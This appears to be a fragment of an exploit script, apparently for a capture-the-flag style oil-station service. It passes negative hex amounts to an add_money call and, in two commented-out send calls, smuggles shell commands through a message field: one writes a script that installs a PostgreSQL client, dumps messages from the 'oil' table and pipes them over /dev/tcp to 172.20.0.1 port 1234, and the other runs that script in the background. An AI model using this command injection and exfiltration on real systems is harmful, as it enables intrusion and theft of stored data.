...
add_money(uid, amount=-0x38aeb0, oil_id=-0x5b, station_id=to)
...
# send(uid, balance=1, fr=fr, to=to, msg='echo \'export DEBIAN_FRONTEND=noninteractive\napt update\napt install -y postgresql\nPGPASSWORD=app psql -U app -d app -h db -c "select message from oil where time > 0" > /dev/tcp/172.20.0.1/1234\' > /tmp/s'.ljust(0x40, ' '))
# send(uid, balance=1, fr=fr, to=to, msg='bash /tmp/s &'.ljust(0x40, ' '))
